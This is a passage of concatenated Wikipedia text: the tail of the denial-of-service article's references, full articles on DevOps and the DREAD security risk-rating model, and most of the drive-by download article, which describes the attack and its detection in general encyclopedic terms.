. Retrieved 
4 February
 2016
.




^
 
Palmer, Daniel (19 August 2016). 
"Experts cast doubt on Census DDoS claims"
. Delimiter
. Retrieved 
31 January
 2018
.




^
 
"Backscatter Analysis (2001)"
. 
Animations
 (video). 
Cooperative Association for Internet Data Analysis
. Retrieved 
11 December
 2013
.




^
 
"FBI Seizes 15 DDoS-For-Hire Websites"
. 
Kotaku
. 6 January 2019.




^
 
"Cybercrime Legislation Worldwide | UNCTAD"
. 
unctad.org
. Retrieved 
8 April
 2024
.




^
 
"United States Code: Title 18,1030. Fraud and related activity in connection with computers | Government Printing Office"
. gpo.gov. 25 October 2002
. Retrieved 
15 January
 2014
.




^
 
"Utah Man Sentenced for Computer Hacking Crime"
. 2 July 2019. 
Archived
 from the original on 10 July 2019.




^
 
Smolaks, Max (4 July 2019). 
"Get rekt: Two years in clink for game-busting DDoS brat DerpTrolling"
. 
The Register
. Retrieved 
27 September
 2019
. 
Austin Thompson, aka DerpTrolling, who came to prominence in 2013 by launching Distributed Denial of Service (DDoS) attacks against major video game companies, has been sentenced to 27 months in prison by a federal court. Thompson, a resident of Utah, will also have to pay $95,000 to Daybreak Games, which was owned by Sony when it suffered at the hands of DerpTrolling. Between December 2013 and January 2014, Thompson also brought down Valve's Steam – the largest digital distribution platform for PC gaming – as well as Electronic Arts' Origin service and Blizzard's BattleNet. The disruption lasted anywhere from hours to days.




^
 
"International Action Against DD4BC Cybercriminal Group"
. 
EUROPOL
. 12 January 2016.




^
 
"Computer Misuse Act 1990"
. 
legislation.gov.uk — The National Archives, of UK
. 10 January 2008.




^
 
"Newsroom"
. 
Europol
. Retrieved 
29 January
 2019
.




^
 
"Authorities across the world going after users of biggest DDoS-for-hire website"
. 
Europol
. Retrieved 
29 January
 2019
.




^
 
"Anonymous DDoS Petition: Group Calls On White House To Recognize Distributed Denial Of Service As Protest"
. HuffingtonPost.com. 12 January 2013.






Further reading
[
edit
]




Ethan Zuckerman; Hal Roberts; Ryan McGrady; Jillian York; John Palfrey (December 2011). 
"Distributed Denial of Service Attacks Against Independent Media and Human Rights Sites"
 
(PDF)
. The Berkman Center for Internet & Society at Harvard University. Archived from 
the original
 
(PDF)
 on 26 February 2011
. Retrieved 
2 March
 2011
.


"DDOS Public Media Reports"
. Harvard. Archived from 
the original
 on 25 December 2010.


PC World - Application Layer DDoS Attacks are Becoming Increasingly Sophisticated




External links
[
edit
]


RFC
 
4732
 Internet Denial-of-Service Considerations


Akamai State of the Internet Security Report
 - Quarterly Security and Internet trend statistics


W3C The World Wide Web Security FAQ


cert.org
 CERT's Guide to DoS attacks. (historic document)


ATLAS Summary Report
 – Real-time global report of DDoS attacks.


Low Orbit Ion Cannon
 - The Well Known Network Stress Testing Tool


High Orbit Ion Cannon
 - A Simple HTTP Flooder


LOIC SLOW
 An Attempt to Bring SlowLoris and Slow Network Tools on LOIC


v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation




Authority control databases
: National 
United States
France
BnF data
Israel










Retrieved from "
https://en.wikipedia.org/w/index.php?title=Denial-of-service_attack&oldid=1243432839
"


Categories
: 
Denial-of-service attacks
Cyberwarfare
Types of cyberattacks
Internet outages
Hidden categories: 
CS1 maint: location missing publisher
CS1 maint: multiple names: authors list
CS1 Simplified Chinese-language sources (zh-hans)
CS1: long volume value
All pages needing factual verification
Wikipedia articles needing factual verification from March 2023
CS1 maint: bot: original URL status unknown
Articles with short description
Short description is different from Wikidata
Articles needing additional references from February 2024
All articles needing additional references
Use dmy dates from May 2024
Articles to be expanded from July 2017
All articles to be expanded
All articles with unsourced statements
Articles with unsourced statements from April 2024
Articles with unsourced statements from May 2022
All articles with failed verification
Articles with failed verification from April 2021
Articles with unsourced statements from March 2013
Pages displaying short descriptions of redirect targets via Module:Annotated link









Checked






From Wikipedia, the free encyclopedia




Page version status
This is an accepted version of this page
This is the 
latest accepted revision
, 
reviewed
 on 
16 September 2024
.


Set of software development practices




DevOps
 is a methodology in the software development and IT industry. Used as a set of practices and tools, DevOps integrates and automates the work of 
software development
 (
Dev
) and 
IT operations
 (
Ops
) as a means for improving and shortening the 
systems development life cycle
.
[
1
]
 DevOps is complementary to 
agile software development
; several DevOps aspects came from the 
agile
 way of working.

Automation is an important part of DevOps. 
Software programmers
 and 
architects
 should use "
fitness functions
" to keep their software in check.
[
2
]






Definition
[
edit
]


Other than it being a cross-functional combination (and a 
portmanteau
) of the terms and concepts for "development" and "operations", academics and practitioners have not developed a universal definition for the term "DevOps".
[
a
]
[
b
]
[
c
]
[
d
]
 Most often, DevOps is characterized by key principles: shared ownership, workflow automation, and rapid feedback.
From an academic perspective, 
Len Bass
, Ingo Weber, and Liming Zhu—three computer science researchers from the 
CSIRO
 and the 
Software Engineering Institute
—suggested defining DevOps as "a set of practices intended to reduce the time between committing a change to a system and the change being placed into normal production, while ensuring high quality".
[
6
]

However, the term is used in multiple contexts. At its most successful, DevOps is a combination of specific practices, culture change, and tools.
[
7
]




History
[
edit
]


Proposals to combine software development methodologies with deployment and operations concepts began to appear in the late 80s and early 90s.
[
8
]


Around 2007 and 2008, concerns were raised by those within the software development and IT communities that the separation between the two industries, where one wrote and created software entirely separate from those that deploy and support the software was creating a fatal level of dysfunction within the industry.
[
9
]


In 2009, the first conference named DevOps Days was held in 
Ghent
, 
Belgium
. The conference was founded by Belgian consultant, project manager and agile practitioner Patrick Debois.
[
10
]
[
11
]
 The conference has now spread to other countries.
[
12
]


In 2012, a report called "State of DevOps" was first published by Alanna Brown at 
Puppet Labs
.
[
13
]
[
14
]


As of 2014, the annual State of DevOps report was published by 
Nicole Forsgren
, Gene Kim, Jez Humble and others. They stated that the adoption of DevOps was accelerating.
[
15
]
[
16
]
 Also in 2014, Lisa Crispin and Janet Gregory wrote the book More Agile Testing, containing a chapter on testing and DevOps.
[
17
]
[
18
]


In 2016, the 
DORA
 metrics for throughput (deployment frequency, lead time for changes), and stability (mean time to recover, change failure rate) were published in the State of DevOps report.
[
13
]
 However, the research methodology and metrics were criticized by experts.
[
19
]
[
20
]
[
21
]
[
22
]
 In response to these criticisms, the 2023 State of DevOps report 
[
23
]
 published changes that updated the stability metric "mean time to recover" to "failed deployment recovery time" acknowledging the confusion the former metric has caused.
[
24
]




Relationship to other approaches
[
edit
]


Many of the ideas fundamental to DevOps practices are inspired by, or mirror, other well known practices such as 
Lean
 and 
Deming's
 
Plan-Do-Check-Act
 cycle, through to 
The Toyota Way
 and the 
Agile
 approach of breaking down components and batch sizes.
[
25
]
 Contrary to the "top-down" prescriptive approach and rigid framework of 
ITIL
 in the 1990s, DevOps is "bottom-up" and flexible, having been created by software engineers for their own needs.
[
26
]




Agile
[
edit
]


Main article: 
Agile software development


The motivations for what has become modern DevOps and several standard DevOps practices such as automated build and test, 
continuous integration
, and 
continuous delivery
 originated in the Agile world, which dates (informally) to the 1990s, and formally to 2001. Agile development teams using methods such as 
extreme programming
 couldn't "satisfy the customer through early and continuous delivery of valuable software"
[
27
]
 unless they took responsibility for operations and infrastructure for their applications, automating much of that work. Because 
Scrum
 emerged as the dominant Agile framework in the early 2000s and it omitted the engineering practices that were part of many Agile teams, the movement to automate operations and infrastructure functions splintered from Agile and expanded into what has become modern DevOps. Today, DevOps focuses on the deployment of developed software, whether it is developed using Agile oriented methodologies or other methodologies.



ArchOps
[
edit
]


ArchOps presents an extension for DevOps practice, starting from 
software architecture
 artifacts, instead of source code, for operation deployment.
[
28
]
 ArchOps states that architectural models are first-class entities in software development, deployment, and operations.



Continuous Integration and Delivery (CI/CD)
[
edit
]


Main article: 
CI/CD


Automation is a core principle for achieving DevOps success and CI/CD is a critical component.
[
29
]
 Plus, improved collaboration and communication between and within teams helps achieve faster 
time to market
, with reduced risks.
[
30
]




Mobile DevOps
[
edit
]


Main article: 
Mobile DevOps


Mobile DevOps is a set of practices that applies the principles of DevOps specifically to the development of mobile applications. Traditional DevOps focuses on streamlining the 
software development process
 in general, but 
mobile development
 has its own unique challenges that require a tailored approach.
[
31
]
 Mobile DevOps is not simply as a branch of DevOps specific to mobile app development, instead an extension and reinterpretation of the DevOps philosophy due to very specific requirements of the mobile world.



Site-reliability engineering
[
edit
]


Main article: 
Site reliability engineering


In 2003, 
Google
 developed 
site reliability engineering
 (SRE), an approach for releasing new features continuously into large-scale high-availability systems while maintaining high-quality end-user experience.
[
32
]
 While SRE predates the development of DevOps, they are generally viewed as being related to each other. Some of the original authors of the discipline consider SRE as an implementation of DevOps.
[
33
]




Toyota production system, lean thinking, kaizen
[
edit
]


Main article: 
Toyota Production System


Toyota production system, also known under the acronym TPS, was the inspiration for 
lean thinking
 with its focus on 
continuous improvement
, 
kaizen
, flow and small batches. The 
andon cord principle
 to create fast feedback, swarm and solve problems stems from TPS.
[
34
]
[
35
]




DevSecOps, shifting security left
[
edit
]


DevSecOps is an augmentation of DevOps to allow for security practices to be integrated into the DevOps approach. Contrary to a traditional centralized security team model, each delivery team is empowered to factor in the correct security controls into their software delivery. Security practices and testing are performed earlier in the development lifecycle, hence the term "
shift left
". Security is tested in three main areas: static, software composition, and dynamic.

Checking software statically via 
static application security testing
 (SAST) is 
white-box testing
 with special focus on security. Depending on the programming language, different tools are needed to do such static code analysis. The software composition is analyzed, especially libraries, and the version of each component is checked against vulnerability lists published by 
CERT
 and other expert groups. When giving software to clients, library licenses and their match to the license of the software distributed are in focus, especially 
copyleft
 licenses.

In dynamic testing, also called 
black-box testing
, software is tested without knowing its inner functions. In DevSecOps this practice may be referred to as 
dynamic application security testing
 (DAST) or penetration testing. The goal is early detection of defects including 
cross-site scripting
 and 
SQL injection
 vulnerabilities. Threat types are published by the 
open web application security project
, e.g. its TOP10,
[
36
]
 and by other bodies. 

DevSecOps has also been described as a cultural shift involving a holistic approach to producing secure software by integrating security education, security by design, and security automation.
[
37
]




Cultural change
[
edit
]


DevOps initiatives can create cultural changes in companies
[
38
]
 by transforming the way 
operations
, 
developers
, and 
testers
 collaborate during the development and delivery processes.
[
39
]
 Getting these groups to work cohesively is a critical challenge in enterprise DevOps adoption.
[
40
]
[
41
]
 DevOps is as much about culture as it is about the toolchain.
[
42
]




Microservices
[
edit
]


Although in principle it is possible to practice DevOps with any architectural style, the 
microservices
 architectural style is becoming the standard for building continuously deployed systems. Small size service allows the architecture of an individual service to emerge through continuous refactoring.
[
43
]




DevOps automation
[
edit
]


It also supports consistency, reliability, and efficiency within the organization, and is usually enabled by a shared code repository or version control. As DevOps researcher Ravi Teja Yarlagadda hypothesizes, "Through DevOps, there is an assumption that all functions can be carried out, controlled, and managed in a central place using a simple code."
[
44
]




Automation with version control
[
edit
]


Many organizations use 
version control
 to power DevOps automation technologies like 
virtual machines
, containerization (or 
OS-level virtualization
), and 
CI/CD
. The paper "DevOps: development of a toolchain in the banking domain" notes that with teams of developers working on the same project, "All developers need to make changes to the same codebase and sometimes edit even the same files. For efficient working, there has to be a system that helps engineers avoid conflicts and retain the codebase history,"
[
45
]
 with the 
Git
 version control system and the 
GitHub
 platform referenced as examples.



GitOps
[
edit
]


GitOps evolved from DevOps. The specific state of deployment configuration is 
version-controlled
. Because the most popular 
version-control
 is 
Git
, GitOps' approach has been named after 
Git
. Changes to configuration can be managed using 
code review
 practices, and can be rolled back using version-controlling. Essentially, all of the changes to a code are tracked, bookmarked, and making any updates to the history can be made easier. As explained by 
Red Hat
, 
"visibility to change means the ability to trace and reproduce issues quickly, improving overall security."
[
46
]




See also
[
edit
]


DataOps


DevOps toolchain


Twelve-Factor App methodology


Infrastructure as code


Lean software development


Site reliability engineering


Value stream


List of build automation software


Notes
[
edit
]






^
 
Dyck et al. (2015) "To our knowledge, there is no uniform definition for the terms release engineering and DevOps. As a consequence, many people use their own definitions or rely on others, which results in confusion about those terms."
[
3
]




^
 
Jabbari et al. (2016) "The research results of this study showed the need for a definition as individual studies do not consistently define DevOps."
[
4
]




^
 
Erich et al. (2017) "We noticed that there are various gaps in the study of DevOps: There is no consensus of what concepts DevOps covers, nor how DevOps is defined."
[
5
]




^
 
Erich et al. (2017) "We discovered that there exists little agreement about the characteristics of DevOps in the academic literature."
[
5
]






References
[
edit
]






^
 
Courtemanche, Meredith; Mell, Emily; Gills, Alexander S. 
"What Is DevOps? The Ultimate Guide"
. 
TechTarget
. Retrieved 
2023-01-22
.




^
 
Fundamentals of Software Architecture: An Engineering Approach
. O'Reilly Media. 2020. 
ISBN
 
978-1492043454
.




^
 
Dyck, Andrej; Penners, Ralf; Lichter, Horst (2015-05-19). "Towards Definitions for Release Engineering and DevOps". 
2015 IEEE/ACM 3rd International Workshop on Release Engineering
. 
IEEE
. p. 3. 
doi
:
10.1109/RELENG.2015.10
. 
ISBN
 
978-1-4673-7070-7
. 
S2CID
 
4659735
.




^
 
Jabbari, Ramtin; bin Ali, Nauman; Petersen, Kai; Tanveer, Binish (May 2016). "What is DevOps?: A Systematic Mapping Study on Definitions and Practices". 
Proceedings of the 2016 Scientific Workshop
. 
Association for Computing Machinery
.




^ 
a
 
b
 
Erich, F.M.A.; Amrit, C.; Daneva, M. (June 2017). 
"A Qualitative Study of DevOps Usage in Practice"
 
(PDF)
. 
Journal of Software: Evolution and Process
. 
29
 (6): e1885. 
doi
:
10.1002/smr.1885
. 
S2CID
 
35914007
.




^
 
Bass, Len; Weber, Ingo; Zhu, Liming (2015). 
DevOps: A Software Architect's Perspective
. Addison-Wesley. 
ISBN
 
978-0134049847
.




^
 
Muñoz, Mirna; Negrete Rodríguez, Mario (April 2021). "A guidance to implement or reinforce a DevOps approach in organizations: A case study".
 
{{
cite journal
}}
: 
Cite journal requires 
|journal=
 (
help
)




^
 
Chapman, M., Gatti, N: A model of a service life cycle, Proceedings of TINA '93, pp. I-205–I-215, Sep., 1993.




^
 
Atlassian. 
"History of DevOps"
. 
Atlassian
. Retrieved 
2023-02-23
.




^
 
Mezak, Steve (25 January 2018). 
"The Origins of DevOps: What's in a Name?"
. devops.com
. Retrieved 
6 May
 2019
.




^
 
Debois, Patrick (9 October 2008). 
"Agile 2008 Toronto"
. Just Enough Documented Information
. Retrieved 
12 March
 2015
.




^
 
Debois, Patrick. 
"DevOps Days"
. DevOps Days
. Retrieved 
31 March
 2011
.




^ 
a
 
b
 
Alana Brown; Nicole Forsgren; Jez Humble; Nigel Kersten; Gene Kim (2016). 
"2016 State of DevOps Report"
 
(PDF)
. Puppet Labs, DORA (DevOps Research
. Retrieved 
2024-04-24
.




^
 
"Puppet - Alanna Brown"
. Puppet Labs
. Retrieved 
2019-04-27
.




^
 
Nicole Forsgren; Gene Kim; Nigel Kersten; Jez Humble (2014). 
"2014 State of DevOps Report"
 
(PDF)
. Puppet Labs, IT Revolution Press and ThoughtWorks
. Retrieved 
2024-04-24
.




^
 
"2015 State of DevOps Report"
 
(PDF)
. Puppet Labs, Pwc, IT Revolution Press. 2015
. Retrieved 
2024-04-24
.




^
 
"More Agile Testing"
 
(PDF)
. October 2014
. Retrieved 
2019-05-06
.




^
 
Crispin, Lisa; Gregory, Janet (October 2014). 
More Agile Testing
. Addison-Wesley. 
ISBN
 
9780133749571
. Retrieved 
2019-05-06
.




^
 
Turner, Graham (20 November 2023). 
"Report: Software Engineers Face Backlash for Reporting Wrongdoing"
. 
DIGIT
. Retrieved 
5 January
 2024
.




^
 
Saran, Cliff. 
"Software engineers worry about speaking out - Computer Weekly"
. 
ComputerWeekly.com
. Retrieved 
5 January
 2024
.




^
 
"75% of software engineers faced retaliation the last time they reported wrongdoing - ETHRWorldSEA"
. 
ETHRWorld.com
.




^
 
Cummins, Holly. 
"Holly Cummins on X"
. 
X.com
. Retrieved 
5 January
 2024
.




^
 
DeBellis, Derek; Lewis, Amanda; Villalba, Daniella; Farley, Dave. 
"2023 State of DevOps Report"
. Google Cloud DevOps Research and Assessment
. Retrieved 
2024-04-24
.




^
 
DeBellis, Derek; Harvey, Nathan. 
"2023 State of DevOps Report: Culture is everything"
. 
Google Cloud Blog
. Retrieved 
2024-04-24
.




^
 
Klein, Brandon Thorin (2021-05-01). 
"The DevOps: A Concise Understanding to the DevOps Philosophy and Science"
. 
Osti.gov
. 
doi
:
10.2172/1785164
. 
OSTI
 
1785164
. 
S2CID
 
236606284
.




^
 
"The History and Evolution of DevOps | Tom Geraghty"
. 5 July 2020
. Retrieved 
2020-11-29
.




^
 
"Principles behind the Agile Manifesto"
. 
agilemanifesto.org
. Retrieved 
2020-12-06
.




^
 
Castellanos, Camilo; Correal, Dario (15 September 2018). "Executing Architectural Models for Big Data Analytics". 
Software Architecture
. Lecture Notes in Computer Science. Vol. 11048. pp. 364–371. 
doi
:
10.1007/978-3-030-00761-4_24
. 
ISBN
 
978-3-030-00760-7
.




^
 
Humble, Jez; Farley, David (2011). 
Continuous Delivery: reliable software releases through build, test, and deployment automation
. Pearson Education Inc. 
ISBN
 
978-0-321-60191-9
.




^
 
Chen, Lianping (2015). "Continuous Delivery: Huge Benefits, but Challenges Too". 
IEEE Software
. 
32
 (2): 50–54. 
doi
:
10.1109/MS.2015.27
. 
S2CID
 
1241241
.




^
 
Tak, Rohin; Modi, Jhalak (2018). 
Mobile DevOps: Deliver continuous integration and deployment within your mobile applications
. Packt Publishing. pp. 12–18. 
ISBN
 
9781788296243
.




^
 
Beyer, Betsy; Jones, Chris; Petoff, Jennifer; Murphy, Niall Richard (April 2016). 
Site Reliability Engineering
. O'Reilly Media. 
ISBN
 
978-1-4919-2909-4
.




^
 
Dave Harrison (9 Oct 2018). 
"Interview with Betsy Beyer, Stephen Thorne of Google"
. Retrieved 
24 July
 2024
.




^
 
Analyzing the DNA of DevOps
, Brent Aaron Reed, Willy Schaub, 2018-11-14.




^
 
Gene Kim; Patrick Debois; John Willis; Jezz Humble (2016). 
The DevOps Handbook: How to Create World-Class Agility, Reliability, and Security in Technology Organizations
.




^
 
"OWASP TOP10"
. 
Archived
 from the original on June 8, 2023
. Retrieved 
June 8,
 2023
.




^
 
Wilson, Glenn (December 2020). 
'DevSecOps: A leader's guide to producing secure software with compromising flow, feedback and continuous improvement'
. Rethink Press. 
ISBN
 
978-1781335024
.




^
 
Emerging Technology Analysis: DevOps a Culture Shift, Not a Technology (Report). Gartner.




^
 
Loukides, Mike (7 June 2012). 
"What is DevOps?"
. 
O'Reilly Media
.




^
 
"Gartner IT Glossary – devops"
. 
Gartner
. Retrieved 
30 October
 2015
.




^
 
Jones, Stephen; Noppen, Joost; Lettice, Fiona (21 July 2016). 
Proceedings of the 2nd International Workshop on Quality-Aware DevOps - QUDOS 2016
 
(PDF)
. pp. 7–11. 
doi
:
10.1145/2945408.2945410
. 
ISBN
 
9781450344111
. 
S2CID
 
515140
.




^
 
Mandi Walls (25 September 2015). 
"Building a DevOps culture"
. O'Reilly.




^
 
Chen, Lianping; Ali Babar, Muhammad (2014). "2014 IEEE/IFIP Conference on Software Architecture". 
The 11th Working IEEE/IFIP Conference on Software Architecture(WICSA 2014)
. IEEE. pp. 195–204. 
doi
:
10.1109/WICSA.2014.45
. 
ISBN
 
978-1-4799-3412-6
.




^
 
Teja Yarlagadda, Ravi (9 March 2021). "DevOps and Its Practices". 
SSRN
 
3798877
.




^
 
Morisio, Maurizio (16 April 2021). 
DevOps: development of a toolchain in the banking domain
. 
Politecnico di Torino
 (laurea thesis)
. Retrieved 
16 August
 2021
.




^
 
"What is GitOps?"
. 
www.redhat.com
. Retrieved 
2023-03-30
.






Further reading
[
edit
]


Davis, Jennifer; Daniels, Ryn (2016-05-30). 
Effective DevOps : building a culture of collaboration, affinity, and tooling at scale
. Sebastopol, CA: O'Reilly. 
ISBN
 
9781491926437
. 
OCLC
 
951434424
.


Kim, Gene; Debois, Patrick; Willis, John; Humble, Jez; Allspaw, John (2015-10-07). 
The DevOps handbook : how to create world-class agility, reliability, and security in technology organizations
 (First ed.). Portland, OR. 
ISBN
 
9781942788003
. 
OCLC
 
907166314
.
{{
cite book
}}
:  CS1 maint: location missing publisher (
link
)


Forsgren, Nicole; Humble, Jez; Kim, Gene (27 March 2018). 
Accelerate: The Science of Lean Software and DevOps: Building and Scaling High Performing Technology Organizations
 (First ed.). IT Revolution Press. 
ISBN
 
9781942788331
.


v
t
e
Software engineering
Fields


Computer programming


DevOps


Empirical software engineering


Experimental software engineering


Formal methods


Requirements engineering


Search-based software engineering


Site reliability engineering


Social software engineering


Software deployment


Software design


Software maintenance


Software testing


Systems analysis


Concepts


Abstraction


Component-based software engineering


Software compatibility


Backward compatibility


Compatibility layer


Compatibility mode


Forward compatibility


Software incompatibility


Data modeling


Enterprise architecture


Functional specification


Modeling language


Programming paradigm


Software


Software archaeology


Software architecture


Software configuration management


Software development process/methodology


Software quality


Software quality assurance


Software verification and validation


Software system


Structured analysis


Essential analysis


CI/CD


Orientations


Agile


Aspect-oriented


Object orientation


Ontology


Service orientation


SDLC


Models
Developmental


Agile


EUP


Executable UML


Incremental model


Iterative model


Prototype model


RAD


UP


Scrum


Spiral model


V-model


Waterfall model


XP


Model-driven engineering


Round-trip engineering


Other


SPICE


CMMI


Data model


ER model


Function model


Information model


Metamodeling


Object model


Systems model


View model


Languages


IDEF


UML


USL


SysML


Related fields


Computer science


Computer engineering


Information science


Project management


Risk management


Systems engineering




 
Commons


 
Category




Retrieved from "
https://en.wikipedia.org/w/index.php?title=DevOps&oldid=1245953239
"


Categories
: 
Agile software development
Software development process
Information technology management
Software development
Hidden categories: 
CS1 errors: missing periodical
Articles with short description
Short description is different from Wikidata
Wikipedia pending changes protected pages
CS1 maint: location missing publisher











From Wikipedia, the free encyclopedia






Computer security threat assessment model


DREAD
 is part of a system for risk-assessing 
computer security
 
threats
 that was formerly used at Microsoft.
[
1
]
 It provides a 
mnemonic
 for risk rating security threats using five categories.





Categories
[
edit
]


The categories are:



D
amage – how bad would an attack be?


R
eproducibility – how easy is it to reproduce the attack?


E
xploitability – how much work is it to launch the attack?


A
ffected users – how many people will be impacted?


D
iscoverability – how easy is it to discover the threat?


The DREAD name comes from the initials of the five categories listed. It was initially proposed for 
threat modeling
 but was abandoned when it was discovered that the ratings are not very consistent and are subject to debate. It was discontinued at Microsoft by 2008.
[
2
]


When a given threat is assessed using DREAD, each category is given a rating from 1 to 10.
[
3
]
 The sum of all ratings for a given issue can be used to prioritize among different issues.



Discoverability debate
[
edit
]


Some security experts feel that including the "Discoverability" element as the last D rewards 
security through obscurity
, so some organizations have either moved to a DREAD-D "DREAD minus D" scale (which omits Discoverability) or always assume that Discoverability is at its maximum rating.
[
4
]
[
5
]




See also
[
edit
]


Cyber security and countermeasure


STRIDE


References
[
edit
]






^
 
Shostack, Adam. 
"Experiences Threat Modeling at Microsoft"
 
(PDF)
.




^
 
"
Do you use DREAD as it is?
"
. Archived from 
the original
 on 2016-03-06
. Retrieved 
2014-09-08
.




^
 
"Security/OSSA-Metrics - OpenStack"
. 
wiki.openstack.org
.




^
 
"Security/OSSA-Metrics - OpenStack"
. 
wiki.openstack.org
.




^
 
"Threat Modeling | OWASP"
. 
owasp.org
.






External links
[
edit
]


Improving Web Application Security: Threats and Countermeasures


DREADful, an MSDN blog post


Experiences Threat Modeling at Microsoft, Adam Shostack






This 
computer security
 article is a 
stub
. You can help Wikipedia by 
expanding it
.
v
t
e










Retrieved from "
https://en.wikipedia.org/w/index.php?title=DREAD_(risk_assessment_model)&oldid=1220645265
"


Categories
: 
Computer security
Computer security stubs
Hidden categories: 
Articles with short description
Short description is different from Wikidata
All stub articles











From Wikipedia, the free encyclopedia






Computer security exploitation




In 
computer security
, a 
drive-by download
 is the unintended 
download
 of 
software
, typically 
malicious software
. The term "drive-by download" usually refers to a download which was authorized by a user without understanding what is being downloaded, such as in the case of a 
Trojan horse
. In other cases, the term may simply refer to a download which occurs without a user's knowledge. Common types of files distributed in drive-by download attacks include 
computer viruses
, 
spyware
, or 
crimeware
. 

Drive-by downloads may happen when visiting a 
website
,
[
1
]
 opening an 
e-mail attachment
 or clicking a link, or clicking on a deceptive pop-up window:
[
2
]
 by clicking on the window in the mistaken belief that, for example, an error report from the computer's operating system itself is being acknowledged or a seemingly innocuous advertisement pop-up is being dismissed. In such cases, the "supplier" may claim that the user "consented" to the download, although the user was in fact unaware of having started an unwanted or malicious software download. Similarly if a person is visiting a site with malicious content, the person may become victim to a drive-by download attack. That is, the malicious content may be able to exploit 
vulnerabilities
 in the 
browser
 or 
plugins
 to run malicious code without the user's knowledge.
[
3
]


A 
drive-by install
 (or 
installation
) is a similar event. It refers to 
installation
 rather than download (though sometimes the two terms are used interchangeably).





Process
[
edit
]


When creating a drive-by download, an attacker must first create their malicious content to perform the attack. With the rise in exploit packs that contain the vulnerabilities needed to carry out unauthorized drive-by download attacks, the skill level needed to perform this attack has been reduced.
[
3
]


The next step is to host the malicious content that the attacker wishes to distribute. One option is for the attacker to host the malicious content on their own 
server
. However, because of the difficulty in directing users to a new page, it may also be hosted on a compromised legitimate website, or a legitimate website unknowingly distributing the attackers content through a 
third party service
 (e.g. an advertisement).  When the content is loaded by the client, the attacker will analyze the 
fingerprint
 of the client in order to tailor the code to exploit vulnerabilities specific to that client.
[
4
]


Finally, the attacker exploits the necessary vulnerabilities to launch the drive-by download attack. Drive-by downloads usually use one of two strategies. The first strategy is exploiting 
API
 calls for various 
plugins
. For example, the DownloadAndInstall API of the Sina 
ActiveX
 component did not properly check its parameters and allowed the downloading and execution of arbitrary files from the internet. The second strategy involves writing 
shellcode
 to memory, and then exploiting vulnerabilities in the web browser or plugin to divert the control flow of the program to the shell code.
[
4
]
 After the shellcode has been executed, the attacker can perform further malicious activities. This often involves downloading and installing 
malware
, but can be anything, including stealing information to send back to the attacker.
[
3
]


The attacker may also take measures to prevent detection throughout the attack. One method is to rely on the 
obfuscation
 of the malicious code. This can be done through the use of 
iframes
.
[
3
]
 Another method is to encrypt the malicious code to prevent detection. Generally the attacker encrypts the malicious code into a 
ciphertext
, then includes the decryption method after the ciphertext.
[
4
]




Detection and prevention
[
edit
]


Detection of drive-by download attacks is an active area of research. Some methods of detection involve 
anomaly detection
, which tracks for state changes on a user's computer system while the user visits a webpage. This involves monitoring the user's computer system for anomalous changes when a web page is rendered. Other methods of detection include detecting when malicious code (shellcode) is written to memory by an attacker's exploit. Another detection method is to make run-time environments that allow 
JavaScript
 code to run and track its behavior while it runs. Other detection methods include examining contents of HTML pages to identify features that can be used to identify malicious web pages, and using characteristics of web servers to determine if a page is malicious.
[
3
]
 Some antivirus tools use static 
signatures
 to match patterns of malicious scripts, although these are not very effective because of obfuscation techniques. Detection is also possible by using low-interaction or high-interaction 
honeyclients
.
[
4
]


Drive-by downloads can also be prevented from occurring by using script-blockers such as 
NoScript
, which can easily be added into browsers such as Firefox.  Using such a script-blocker, the user can disable all the scripts on a given webpage, and then selectively re-enable individual scripts on a one-by-one basis in order to determine which ones are truly necessary for webpage functionality.  However, some script-blocking tools can have unintended consequences, such as breaking parts of other websites, which can be a bit of a balancing act.
[
5
]


A different form of prevention, known as "Cujo," is integrated into a web proxy, where it inspects web pages and blocks the delivery of malicious JavaScript code.
[
6
]




See also
[
edit
]


Malvertising


Phishing


BLADE


Mac Flashback


Windows Metafile vulnerability


Dropper (malware)


References
[
edit
]






^
 
Sood, Aditya K.; Zeadally, Sherali (1 September 2016). 
"Drive-By Download Attacks: A Comparative Study"
. 
IT Professional
. 
18
 (5): 18–25. 
doi
:
10.1109/MITP.2016.85
. 
ISSN
 
1520-9202
. 
S2CID
 
27808214
.




^
 
Olsen, Stefanie (8 April 2002). 
"Web surfers brace for pop-up downloads"
. 
CNET
 News
. Retrieved 
28 October
 2010
.




^ 
a
 
b
 
c
 
d
 
e
 
Le, Van Lam; Welch, Ian; Gao, Xiaoying; Komisarczuk, Peter (1 January 2013). 
Anatomy of Drive-by Download Attack
. AISC '13. Darlinghurst, Australia, Australia: Australian Computer Society, Inc. pp. 49–58. 
ISBN
 
9781921770234
.
 
{{
cite book
}}
: 
|journal=
 ignored (
help
)




^ 
a
 
b
 
c
 
d
 
Egele, Manuel; Kirda, Engin; Kruegel, Christopher (1 January 2009). "Mitigating Drive-By Download Attacks: Challenges and Open Problems". 
INetSec 2009 – Open Research Problems in Network Security
. IFIP Advances in Information and Communication Technology. Vol. 309. Springer Berlin Heidelberg. pp. 52–62. 
doi
:
10.1007/978-3-642-05437-2_5
. 
ISBN
 
978-3-642-05436-5
.




^
 
Phillips, Gavin (14 January 2021). 
"What Is a Drive-by Download Malware Attack?"
. Retrieved 
4 January
 2022
.




^
 
